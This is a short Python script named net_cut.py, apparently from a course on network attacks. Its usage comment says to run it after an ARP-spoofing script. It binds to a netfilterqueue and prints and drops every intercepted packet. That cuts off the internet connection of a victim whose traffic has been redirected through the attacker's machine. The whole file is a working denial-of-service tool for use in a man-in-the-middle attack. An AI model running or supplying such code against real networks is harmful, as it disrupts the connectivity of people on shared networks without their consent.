#!/usr/bin/env python

#Usage example: python net_cut.py # after running arp_spoof.py

import netfilterqueue

def process_packet(packet):
    print(packet)
    packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
